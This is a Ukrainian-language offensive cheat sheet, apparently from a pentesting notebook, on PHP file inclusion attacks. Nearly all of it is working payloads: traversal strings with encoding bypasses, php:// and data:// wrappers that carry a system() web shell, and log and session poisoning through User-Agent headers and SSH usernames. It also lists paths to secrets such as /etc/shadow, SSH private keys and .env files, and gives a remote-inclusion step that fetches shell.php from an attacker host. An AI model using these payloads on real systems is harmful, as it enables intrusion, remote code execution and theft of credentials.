# File Inclusion (LFI / RFI)

## LFI — підтвердження

```
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd       # якщо ../  фільтрується
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd    # URL encoding
?page=..%252f..%252fetc%252fpasswd       # double encoding
?page=/etc/passwd%00                     # null byte (PHP < 5.5)
```

---

## PHP Wrappers

```bash
# Base64 вивід джерелу PHP-файлу (обхід виконання):
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=string.rot13/resource=config.php

# Виконання довільного коду через data://:
?page=data://text/plain,<?php system($_GET['cmd']); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# expect:// (потребує розширення — рідко, але варто перевірити):
?page=expect://id

# zip:// (якщо upload є):
# Завантаж ZIP з shell.php → ?page=zip:///var/www/uploads/evil.zip%23shell

# phar:// (аналогічно):
# Завантаж PHAR → ?page=phar:///var/www/uploads/evil.phar/shell
```

---

## LFI → RCE: Log Poisoning

### Apache access log
```bash
# Перевір доступ до лога:
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/httpd/access_log    # CentOS/RHEL

# Отруїти через User-Agent:
curl -s http://TARGET/ -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# або через будь-який параметр що попадає в лог

# Тригер:
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH auth log
```bash
?page=../../../../var/log/auth.log        # Debian/Ubuntu
?page=../../../../var/log/secure          # CentOS/RHEL

# Отруїти — спроба логіну з PHP payload як username:
ssh '<?php system($_GET["cmd"]); ?>'@TARGET

# Тригер:
?page=../../../../var/log/auth.log&cmd=id
```

### Nginx error log
```bash
?page=../../../../var/log/nginx/error.log
# Отруїти через invalid request:
curl http://TARGET/<?php system($_GET['cmd']);?>
```

### /proc/self/environ (старі системи)
```bash
?page=/proc/self/environ
# Отруїти через User-Agent:
curl http://TARGET/ -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
?page=/proc/self/environ&cmd=id
```

### PHP session file
```bash
# Знайди свій session ID (PHPSESSID cookie)
# Сесійний файл: /var/lib/php/sessions/sess_<PHPSESSID>
?page=../../../../var/lib/php/sessions/sess_<id>

# Отруїти — зберегти PHP payload в значення будь-якого поля форми
# якщо сервер записує input у сесійний файл
```

---

## LFI → RCE: Методологія

```
1. Підтвердити LFI через /etc/passwd
2. Перевірити PHP wrappers (php://filter → читання коду)
3. Спробувати log poisoning (apache / auth.log / nginx)
4. Якщо є upload → phar:// або zip://
5. Якщо нічого → шукати конфіги і ключі через читання файлів
```

---

## Корисні шляхи для читання (LFI)

```
/etc/passwd
/etc/shadow                # потребує root-читання
/etc/hosts
/etc/crontab
/home/<user>/.bash_history
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa
/var/www/html/config.php   # DB credentials
/var/www/html/.env
/proc/self/environ
/proc/self/cmdline
/proc/net/tcp              # відкриті з'єднання

# Windows (через path traversal на PHP/IIS):
../../../../windows/system32/drivers/etc/hosts
../../../../windows/win.ini
../../../../inetpub/wwwroot/web.config
```

---

## RFI (Remote File Inclusion)

```bash
# Умова: allow_url_include=On у php.ini (рідко в сучасних системах)

?page=http://ATTACKER/shell.php

# Хостуй shell.php на атакері:
python3 -m http.server 80
# shell.php: <?php system($_GET['cmd']); ?>

# Тригер:
?page=http://ATTACKER/shell.php&cmd=id
```

---

## Wordlist для LFI fuzzing

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u http://TARGET/page?file=FUZZ -fs <baseline>
```

**Зв'язки:** [[Shells-Payloads]] · [[File-Upload-Attacks]] · [[SSRF-SSTI]]
